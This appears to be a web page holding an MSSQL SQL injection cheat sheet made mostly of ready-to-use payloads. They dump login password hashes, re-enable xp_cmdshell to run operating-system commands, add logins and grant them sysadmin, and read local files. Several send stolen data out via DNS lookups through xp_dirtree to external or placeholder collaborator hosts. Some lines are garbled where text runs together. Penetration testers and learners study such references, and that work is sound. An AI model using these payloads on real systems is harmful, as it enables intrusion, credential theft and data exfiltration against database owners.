layout: page
title: "MSSQL Injection Cheat Sheet"
permalink: /mssqli
---

# MSSQLI

### Current Database
```bash
SELECT DB_NAME()
```

### String concatenation: 
You can concatenate together multiple strings to make a single string.
```bash
'foo'+'bar'
```
### Substring: 
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.

```bash
SUBSTRING('foobar', 4, 2)`
```

### COMMENTS: You can use comments to truncate a query and remove the portion of the original query that follows your input.
```bash
--comment

/*comment*/
```


### Database version: You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

```bash
SELECT @@version
```


### ORDER BY 
```bash
ORDER BY N-- Where N input number 1,2,3,4,5,6,7,8 etc..
```
### Current User	
```bash

SELECT user_name();
SELECT system_user;
SELECT user;
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID

```

### List Users

```bash
SELECT name FROM master..syslogins
```

### List Password Hashes
```bash
SELECT name, password FROM master..sysxlogins - priv, mssql 2000;
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins - priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
SELECT name, password_hash FROM master.sys.sql_logins - priv, mssql 2005;
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins - priv, mssql 2005
```


 ### List Privileges
```bash
 -- current privs on a particular object in 2005, 2008
SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE'); - current database
SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER'); - current server
SELECT permission_name FROM master..fn_my_permissions('master..syslogins', 'OBJECT'); –permissions on a table
SELECT permission_name FROM master..fn_my_permissions('sa', 'USER');


-- permissions on a user– current privs in 2005, 2008
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('dbcreator');
SELECT is_srvrolemember('bulkadmin');
SELECT is_srvrolemember('diskadmin');
SELECT is_srvrolemember('processadmin');
SELECT is_srvrolemember('serveradmin');
SELECT is_srvrolemember('setupadmin');
SELECT is_srvrolemember('securityadmin');


-- who has a particular priv? 2005, 2008
SELECT name FROM master..syslogins WHERE denylogin = 0;
SELECT name FROM master..syslogins WHERE hasaccess = 1;
SELECT name FROM master..syslogins WHERE isntname = 0;
SELECT name FROM master..syslogins WHERE isntgroup = 0;
SELECT name FROM master..syslogins WHERE sysadmin = 1;
SELECT name FROM master..syslogins WHERE securityadmin = 1;
SELECT name FROM master..syslogins WHERE serveradmin = 1;
SELECT name FROM master..syslogins WHERE setupadmin = 1;
SELECT name FROM master..syslogins WHERE processadmin = 1;
SELECT name FROM master..syslogins WHERE diskadmin = 1;
SELECT name FROM master..syslogins WHERE dbcreator = 1;
SELECT name FROM master..syslogins WHERE bulkadmin = 1;

```

### List DBA Accounts
```bash
SELECT is_srvrolemember('sysadmin'); - is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try 'bulkadmin', 'systemadmin' and other values from the documentation https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?redirectedfrom=MSDN&view=sql-server-ver15
SELECT is_srvrolemember('sysadmin', 'sa'); - is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.
SELECT name FROM master..syslogins WHERE sysadmin = '1' - tested on 2005
```


### List Databases:
```
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); -- for N = Number i.e Database number 0, 1, 2, and so on
```

### List Columns:
```
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); - for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; - list colum names and types for master..sometable
```

### List Tables:
```bash
SELECT name FROM master..sysobjects WHERE xtype = 'U'; - use xtype = 'V' for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; - list colum names and types for master..sometable
```

### Find Tables From Column Name:
```bash
- NB: This example works only for the current database.  If you wan't to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' - this lists table, column for each column containing the word 'password'
```

### Select Nth Row:
```bash
SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC - gets 9th row
```
### Select Nth Char
```bash
SELECT substring('abcd', 3, 1) - returns c
```

### Bitwise AND:
```bash
SELECT 6 & 2 - returns 2
SELECT 6 & 1 - returns 0
```
#### ASCII Value -> Char:
```bash
SELECT char(0x41) - returns A
```
### Char -> ASCII Value:
```bash
SELECT ascii('A') – returns 65
```
### Casting:
```bash
SELECT CAST('1' as int);
SELECT CAST(1 as char)
```
### String Concatenation:
```bash
SELECT 'A' + 'B' – returns AB
```
### If Statement:
```bash
IF (1=1) SELECT 1 ELSE SELECT 2 - returns 1
```
### Case Statement:
```bash
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END - returns 1
```
### Avoiding Quotes:
```bash
SELECT char(65)+char(66) - returns AB
```

### Make DNS Requests:
- priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
- Also check out theDNS tunnel feature of sqlninja http://sqlninja.sourceforge.net/sqlninja-howto.html
```bash
declare @host varchar(800); select @host = name FROM master..syslogins; exec('master..xp_getfiledetails "\' + @host + 'c$boot.ini"'); - nonpriv, works on 2000declare @host varchar(800); select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net' from sys.sql_logins; exec('xp_fileexist "\' + @host + 'c$boot.ini"'); 
```


### Command Execution:
```bash
EXEC xp_cmdshell 'net user'; - privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:
EXEC sp_configure 'show advanced options', 1; - priv
RECONFIGURE; - priv
EXEC sp_configure 'xp_cmdshell', 1; - priv
RECONFIGURE; - priv
```

### Local File Access:
```bash
CREATE TABLE mydata (line varchar(8000));
BULK INSERT mydata FROM 'c:boot.ini';
DROP TABLE mydata;
```

### Hostname, IP Address:
```bash
SELECT HOST_NAME()
```
### Create Users:
```bash
EXEC sp_addlogin 'user', 'pass'; - priv
```
### Drop Users:
```bash
EXEC sp_droplogin 'user'; - priv
```
### Make User DBA:
```bash
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; - priv
```
### Location of DB files:
```bash
EXEC sp_helpdb master; –location of master.mdf
EXEC sp_helpdb pubs; –location of pubs.mdf
```
### Default/System Databases:
bash
northwind
model
msdb
pubs - not on sql server 2005
tempdb


### Database contents: 
You can list the tables that exist in the database, and the columns that those tables contain.

```bash
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional errors: 
You can test a single boolean condition and trigger a database error if the condition is true.
```bash
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

### Batched (or stacked) queries:
You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
```bash
QUERY-1-HERE; QUERY-2-HERE
```

### Time delays: 
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
```bash
WAITFOR DELAY '0:0:10'
```
### Conditional time delays:
You can test a single boolean condition and trigger a time delay if the condition is true.
```bash
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```
### DNS lookup:
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
```bash
exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
```


### DNS lookup with data exfiltration:
You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
```bash
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
```

Due to the domain and subdomain max characters limitations, it becomes challenging to exfiltrate data. A maximum of 63 characters are allowed for each subdomain and in total 253 characters for the full domain name. Fragmentation and encoding are two methods that can be used to overcome these limitations.
(SQLi exfiltration using Out of band technique)[https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b]

First Part
```bash
DECLARE @d varchar(1024); DECLARE @T varchar(1024);
SELECT @d = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as
varbinary(max)), 1,LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2) FOR XML PATH(''), BINARY BASE64);
SELECT @T = (SELECT REPLACE(@d, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.YourBRUPCOLLAB.net\egg$"');
```

Second Part
```bash
DECLARE @e varchar(1024); DECLARE @T varchar(1024);
SELECT @e = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as
varbinary(max)), LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2, LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))) FOR XML PATH(''), BINARY BASE64); 
SELECT @T = (SELECT REPLACE(@e, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.BRUPCOLLAB.net\egg$"');
```

### Password Cracker:
MSSQL 2000 and 2005 Hashes are both SHA1-based.  

### Scripts:
[Selenium SQLi automation](https://raw.githubusercontent.com/bleubyte/Selenium_sqli.py/main/main.py) - Needs more work Done, I had scripted this as a POC. The site was using some sort of Javascript token that would only accept clicking on submit in order to work. Burp/SQLIMAP failed
### Resources:
[Pentest Monkeys Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
[Port Swigger SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### other resources add not included
[Sqlninja's MSSQL Cheat Sheet](http://sqlninja.sourceforge.net/sqlninja-howto.html#ss2.13)
